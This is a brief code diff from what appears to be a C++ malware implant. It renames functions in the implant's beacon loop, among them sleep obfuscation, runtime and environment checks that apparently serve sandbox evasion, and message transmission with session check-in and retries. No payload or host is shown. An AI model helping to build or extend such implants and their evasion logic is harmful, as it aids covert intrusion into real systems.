@@ -6,7 +6,7 @@ namespace Implant {
 
         do {
             Opsec::SleepObf();
-            if (!Opsec::SeRuntimeCheck()) {
+            if (!Opsec::RuntimeChecks()) {
                 return_defer(ntstatus);
             }
 
@@ -15,12 +15,12 @@ namespace Implant {
             }
 
             if (!Ctx->session.checkin && !Ctx->transport.outbound_queue) {
-                if(!Opsec::SeCheckEnvironment()) {
+                if(!Opsec::CheckEnvironment()) {
                     return_defer(ntstatus);
                 }
             }
 
-            Dispatcher::MessageTransmit();
+            Dispatcher::MessageRoutine();
 
             if (ntstatus != ERROR_SUCCESS) {
                 Ctx->session.retry++;
